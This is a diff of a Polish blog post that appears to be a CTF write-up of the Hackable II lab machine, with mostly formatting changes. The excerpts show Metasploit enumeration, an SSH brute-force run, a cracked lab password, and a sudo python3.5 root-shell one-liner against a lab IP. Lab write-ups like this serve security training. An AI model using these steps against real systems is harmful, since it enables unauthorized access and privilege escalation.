@@ -164,6 +164,7 @@ Mamy sesję i możemy eksplorować podatny serwer. Teraz użyjemy modułów pow�
 {: .text-justify}
 - post/linux/gather/enum_system
 - post/linux/gather/enum_users_history
+
 ```bash
 msf6 exploit(multi/handler) > use post/linux/gather/enum_system
 msf6 post(linux/gather/enum_system) > show options
@@ -201,10 +202,8 @@ w pliku **20210729214957_default_172.16.1.244_linux.enum.syste_656649.txt** mamy
 {: .notice--info}
 moduł **post/linux/gather/enum_users_history** sciagnie nam plik Sudoers
 {: .notice--info}
-
 Moduł **auxiliary/scanner/ssh/ssh_login** pozwala nam dosyć pobieżnie przeskanować użytkowników i przy okazji ustawić sesję, jeżeli login i hasło będą poprawnę. Również może się przydać do ustawienia sesji w Metasploicie, jeżeli znamy tylko login i hasło. Sprawdźmy czy użytkownicy mają jakieś słabe hasła na systemie. Niestety ten moduł jest dosyć wolny, ale może coś znajdziemy. W parametrach podajemy, żeby używał hasła jako loginu, również podajemy ścieżkę do pliku gdzie zostali zapisani użytkownicy z obrazu hackable II. Verbose należy ustawić na yes, wtedy widać na bieżąco pracę modułu.
 {: .text-justify}
-
 ```bash
 msf6 auxiliary(scanner/ssh/ssh_login) > run
 [*] 172.16.1.244:22 - Starting bruteforce
@@ -313,23 +312,25 @@ echo '⡴⠑⡄⠀⠀⠀⠀⠀⠀⠀ ⣀⣀⣤⣤⣤⣀⡀
 ⠀⠀⠀⠀⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
     shrek:cf4c2232354952690368f1b3dfdfb24d'
 ```
-Na samym dole jest hasło. Hashcat i rockyou.txt szybko się z nim uporają. Hasło to **onion**, ale przecież to było w tytule strony **http://172.16.1.244/files/CALL.html**. Proste maszyny do złamania czasami są bardzo proste. 
+Na samym dole jest hasło. Hashcat i rockyou.txt szybko się z nim uporają. Hasło to **onion**, ale przecież to było w tytule strony **http://172.16.1.244/files/CALL.html**. Proste maszyny do złamania czasami są bardzo proste.
 {: .text-justify}
 Wchodzimy na konto shreka.
 ```bash
 cat user.txt
 ```
 Wyświetli się obrazek (sam zobacz jaki :smiley: ). Jeszcze zostało wejść na root-a. Mamy plik **Sudoers**, a tam jest taka ciekawa linijka:
+{: .text-justify}
 ```
 %shrek ALL = NOPASSWD:/usr/bin/python3.5
 ```
 Program python3.5 ma uprawnienia root-a, ale tylko z grupy shrek. Trzeba to wykorzystać.
+{: .text-justify}
 ```
 -rwxr-xr-x 2 root root 4460304 Oct  9  2020 /usr/bin/python3.5
 ```
-```bash
 Najpierw należy się połączyć na sesję nr 10. Tam wpisujemy shell. Bez shell-a nie odpali się nam Sudo:
-
+{: .text-justify}
+```bash
   Id  Name  Type         Information                        Connection
   --  ----  ----         -----------                        ----------
   2         shell linux  SSH ftp:ftp (172.16.1.244:22)      172.16.1.10:41053 -> 172.16.1.244:22 (172.16.1.244)
@@ -351,7 +352,6 @@ shell
 [*] Trying to find binary 'bash' on the target machine
 [*] Found bash at /bin/bash
 
-
 root@ubuntu:~# sudo python3.5 -c 'import os; os.system("/bin/bash");'
 sudo python3.5 -c 'import os; os.system("/bin/bash");'
 root@ubuntu:~# id
@@ -361,4 +361,4 @@ root@ubuntu:~# cat /root/root.txt
 ```
 
 Wyświetli się obrazek. Jednak wolałbym użyć dodatkowych narzędzi, ale chciałem pokazać siłę Metasploita. Jeżeli się podobał wpis napisz na kerszi@protonmail.com lub skomentuj (jeżeli się da).
-
+{: .text-justify}
